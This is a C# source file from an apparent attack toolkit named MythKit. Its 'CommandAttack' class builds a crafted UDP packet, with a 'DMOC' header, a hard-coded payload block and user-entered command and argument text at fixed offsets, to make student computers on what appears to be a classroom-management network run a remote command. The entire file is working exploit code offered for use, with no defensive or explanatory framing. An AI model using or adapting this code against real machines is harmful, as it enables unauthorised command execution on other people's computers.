using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Windows.Controls;

namespace MythKit.Pages.UDPAttack.AttackFunctions
{
    /// <summary>
    /// CommandAttack.xaml 的交互逻辑
    /// </summary>
    public partial class CommandAttack : UserControl, IAttackPattern
    {
        public CommandAttack()
        {
            InitializeComponent();
        }
        public string AttackName => "远程命令";
        public AttackTarget Target => AttackTarget.Student;
        public AttackPacket ConstructPacket(ref string message, string ip, int cycleCount, int groupCount)
        {
            byte[] packet;
            using (MemoryStream memoryStream = new MemoryStream())
            {
                // Header bytes
                byte[] headerBytes = new byte[]
                {
                    0x44, 0x4D, 0x4F, 0x43, 0x00, 0x00, 0x01, 0x00,
                    0x6E, 0x03, 0x00, 0x00
                };
                memoryStream.Write(headerBytes, 0, headerBytes.Length);

                // Random bytes
                byte[] randomBytes = new byte[16];
                new Random().NextBytes(randomBytes);
                memoryStream.Write(randomBytes, 0, randomBytes.Length);

                // Payload bytes
                byte[] payloadBytes = new byte[]
                {
                    0x20, 0x4E, 0x00, 0x00, 0xC0, 0xA8, 0xE2, 0x80,
                    0x61, 0x03, 0x00, 0x00, 0x61, 0x03, 0x00, 0x00,
                    0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x0F, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00
                };
                memoryStream.Write(payloadBytes, 0, payloadBytes.Length);

                // Command text bytes
                byte[] commandBytes = Encoding.Unicode.GetBytes(AttackPacket.FormatString(Command.Text, ip, cycleCount, groupCount));
                memoryStream.Write(commandBytes, 0, commandBytes.Length);

                // Padding to 572 bytes
                int currentLength = (int)memoryStream.Length;
                if (currentLength < 572)
                {
                    byte[] paddingBytes = new byte[572 - currentLength];
                    memoryStream.Write(paddingBytes, 0, paddingBytes.Length);
                }
                else if (currentLength > 572)
                {
                    message = string.Format("Packet length exceeds 572 bytes (current: {0})", currentLength);
                }

                // Arguments text bytes
                byte[] argumentBytes = Encoding.Unicode.GetBytes(AttackPacket.FormatString(Arguments.Text, ip, cycleCount, groupCount));
                memoryStream.Write(argumentBytes, 0, argumentBytes.Length);

                // Padding to 906 bytes
                currentLength = (int)memoryStream.Length;
                if (currentLength < 906)
                {
                    byte[] finalPaddingBytes = new byte[906 - currentLength];
                    memoryStream.Write(finalPaddingBytes, 0, finalPaddingBytes.Length);
                }
                else if (currentLength > 906)
                {
                    message = string.Format("Packet length exceeds 906 bytes (current: {0})", currentLength);
                }

                packet = memoryStream.ToArray();
            }
            return new AttackPacket(new List<byte[]> { packet });
        }

    }
}
